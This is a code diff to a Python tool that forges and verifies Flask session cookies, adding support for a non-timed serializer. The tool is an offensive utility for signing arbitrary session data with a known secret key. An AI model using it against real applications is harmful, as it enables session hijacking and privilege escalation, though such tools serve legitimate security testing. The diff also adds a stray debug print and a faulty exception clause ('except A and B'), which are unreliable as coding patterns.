@@ -1,5 +1,5 @@
 import argparse
-from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
+from itsdangerous import URLSafeTimedSerializer, BadTimeSignature,BadSignature, URLSafeSerializer, TimedSerializer
 from flask.sessions import session_json_serializer
 from termcolor import colored
 import base64
@@ -9,11 +9,20 @@ class FlaskCookieForger:
                  serializer_type: str, key_derivation: str, digest_method: str):
         self.__payload = payload
         self.__signer  = None
+        self.__signer_type = signer_type
         if signer_type == "URLSafeTimedSerializer":
             serializer = None
             if serializer_type == "session_json_serializer":
                 serializer = session_json_serializer
             self.__signer = URLSafeTimedSerializer(secret_key=secret_key, salt=salt, serializer=serializer,
+                                                   signer_kwargs={'key_derivation': key_derivation,
+                                                                  'digest_method': digest_method})
+        elif signer_type == "URLSafeSerializer":
+            serializer = None
+            print('privetos')
+            if serializer_type == "session_json_serializer":
+                serializer = session_json_serializer
+            self.__signer = URLSafeSerializer(secret_key=secret_key, salt=salt, serializer=serializer,
                                                    signer_kwargs={'key_derivation': key_derivation,
                                                                   'digest_method': digest_method})
         if mode == 0:
@@ -40,20 +49,26 @@ class FlaskCookieForger:
             print(colored('[-]', 'red') + ' For reading cookie you must specify payload')
             exit(-1)
         data = self.__payload.split('.')
-        if len(data) != 3:
+        if len(data) != 3 and len(data) != 2:
             print(colored('[-]', 'red') + " It doesn't look like flask cookie, example of flask cookie - " +
                   colored('eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w', 'yellow'))
             exit(-1)
         try:
             print('cookie = ' + colored(self.__payload, 'yellow'))
-            session_data, timestamp = self.__signer.loads(self.__payload, return_timestamp=True)
+            session_data = None
+            timestamp = str(None)
+            if self.__signer_type == "URLSafeSerializer":
+                session_data= self.__signer.loads(self.__payload)
+            else:
+                session_data, timestamp = self.__signer.loads(self.__payload, return_timestamp=True)
             print('Cookie = ' + colored(session_data, 'yellow') + '\tTimestamp = ' + colored(timestamp, 'yellow'))
             print(colored('[+]', 'green') + ' Signature is fine')
             return True
-        except BadTimeSignature as e:
+        except BadTimeSignature and BadSignature as e:
             print(colored('[-]', 'red') + "Incorrect signature")
             print(e.args)
-            print('Check secret key and salt, also have a look on key derivation and digest methods')
+            print('Check secret key and salt, also have a look on key derivation and digest methods. Also,'
+                  ' if you use signer without timestamp check if serializer work without timestamp')
         return False
 
     def read(self) -> str:
@@ -79,7 +94,7 @@ if __name__ == "__main__":
                                         " or verify. Otherwise it's payload for cookie.")
     parser.add_argument('--signer_type', default='URLSafeTimedSerializer',
                         help="Signer type you want to use. Default value is URLSafeTimedSerializer. Supported signers:"
-                             " URLSafeTimedSerializer.")
+                             " URLSafeTimedSerializer, URLSafeSerializer, .")
     parser.add_argument('--secret_key', default="UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==",
                         help="Secret key that the app uses to sign cookie. Default value is"
                              " UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==. Note! This is " + colored('NOT', 'red') +
